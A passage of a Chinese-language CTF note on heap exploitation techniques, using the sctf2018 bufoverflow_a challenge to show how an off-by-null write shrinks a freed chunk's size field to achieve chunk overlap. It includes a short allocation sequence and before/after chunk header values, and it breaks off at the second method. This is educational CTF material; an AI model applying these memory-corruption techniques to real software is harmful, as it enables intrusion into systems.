# The Method of Heap Use In CTF #
本篇文章的目的旨在对堆的一些使用方法和技巧进行总结，会不定期的更新。
## 1. off by null ##
以 **sctf2018 bufoverflow\_a** 题目为例，off by null的最终目的是为了完成chunk overlap，从而可以对其中的某些chunk内容进行改写。
### 利用方法1： ###
通过改写下一个chunk的size字段，从而将原空闲chunk的大小缩小。  
例如如下所示代码：
  
	Alloc(0x88)		#0
	Alloc(0x400)	#1
	Alloc(0x110)	#2
	Alloc(0x88)		#3

	Delete(0)
	Alloc(0x88)		#0
	Fill("a"*0x88)	//假设Fill函数中存在off by null漏洞，会多写一个"\x0"
此时，我们可以看看对于chunk1 的头部字段，Fill()函数执行前后的变化情况。  
	
	Fill()前
	chunk1:	0x0000000000000000	0x0000000000000411
	Fill()后
	chunk1:	0x6161616161616161	0x0000000000000400
	
### 利用方法2： ###